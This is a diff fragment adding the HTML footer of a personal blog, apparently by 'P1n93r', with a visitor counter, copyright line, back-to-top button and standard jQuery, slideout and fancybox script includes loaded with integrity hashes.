+    <span id="busuanzi_container_site_uv"> 本站总访客数 <span id="busuanzi_value_site_uv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 人 </span>
+  </div>
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span>P1n93r</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
